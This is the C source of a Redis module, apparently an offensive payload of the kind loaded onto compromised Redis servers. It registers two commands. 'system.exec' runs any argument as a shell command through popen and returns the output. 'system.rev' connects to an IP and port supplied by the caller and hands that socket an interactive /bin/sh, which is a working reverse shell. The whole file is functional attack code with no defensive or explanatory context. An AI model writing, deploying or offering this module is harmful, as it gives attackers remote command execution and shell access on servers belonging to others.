#include "redismodule.h"

#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 2) {
                size_t cmd_len;
                size_t size = 1024;
                const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

                FILE *fp = popen(cmd, "r");
                if (fp == NULL) {
                    return RedisModule_ReplyWithError(ctx, "Failed to execute command");
                }
                
                char *buf = malloc(size);
                char *output = malloc(size);
                if (!buf || !output) {
                    free(buf);
                    free(output);
                    pclose(fp);
                    return RedisModule_ReplyWithError(ctx, "Memory allocation failed");
                }
                
                output[0] = '\0';
                
                while (fgets(buf, size, fp) != NULL) {
                        if (strlen(buf) + strlen(output) >= size - 1) {
                                size *= 2;
                                char *new_output = realloc(output, size);
                                if (!new_output) {
                                    free(output);
                                    free(buf);
                                    pclose(fp);
                                    return RedisModule_ReplyWithError(ctx, "Memory reallocation failed");
                                }
                                output = new_output;
                        }
                        strcat(output, buf);
                }
                
                RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
                RedisModule_ReplyWithString(ctx, ret);
                
                free(buf);
                free(output);
                pclose(fp);
        } else {
                return RedisModule_WrongArity(ctx);
        }
        return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 3) {
                size_t cmd_len;
                const char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
                const char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
                int port = atoi(port_s);
                int s;

                struct sockaddr_in sa;
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = inet_addr(ip);
                sa.sin_port = htons(port);

                s = socket(AF_INET, SOCK_STREAM, 0);
                if (s < 0) return REDISMODULE_OK;
                
                if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
                    close(s);
                    return REDISMODULE_OK;
                }
                
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                char *args[] = {"/bin/sh", NULL};
                execve("/bin/sh", args, NULL);
                // If we get here, execve failed
                close(s);
        }
        return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
        
    if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
        
    return REDISMODULE_OK;
}
